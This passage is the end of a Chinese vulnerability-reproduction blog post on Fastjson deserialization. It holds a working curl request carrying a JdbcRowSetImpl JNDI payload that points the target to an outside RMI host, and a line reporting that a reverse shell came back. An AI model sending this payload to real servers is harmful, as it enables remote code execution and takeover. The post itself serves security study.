+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs llvm">curl -X POST http://<span class="hljs-number">101</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">10004</span> \<br>    -H <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate&quot;</span> \<br>    -H <span class="hljs-string">&quot;Accept: */*&quot;</span> \<br>    -H <span class="hljs-string">&quot;Accept-Language: en&quot;</span> \<br>    -H <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span> \<br>    -H <span class="hljs-string">&quot;Connection: close&quot;</span> \<br>    -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>    -d &#x27;&#123;<br>        <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;rmi://39.x.1x.x:1234/TouchFile&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;autoCommit&quot;</span>: <span class="hljs-keyword">true</span><br>        &#125;<br>    &#125;&#x27;<br><br></code></pre></td></tr></table></figure>
+<p><img src="/images/b4e6beba-6e9b-4699-bcc3-4cf2cac2bd7f.png" srcset="/img/loading.gif" lazyload><br>这时我们第三个终端监听的端口反弹了shell<br><img src="/images/acfb1c96-0449-4ce2-847f-0725ca127db7.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Fastjson反序列化漏洞原理与漏洞复现</div>
+      <div>http://example.com/2025/07/29/Fastjson反序列化漏洞原理与漏洞复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>奇怪的奇怪</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/29/Apache_Struts2_CVE-2023-50164/" title="Apache Struts2 CVE-2023-50164">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Apache Struts2 CVE-2023-50164</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/28/Apache_HTTP_Server%202.4.49_%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" title="Apache_HTTP_Server 2.4.49_路径穿越漏洞">
+                        <span class="hidden-mobile">Apache_HTTP_Server 2.4.49_路径穿越漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客量 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
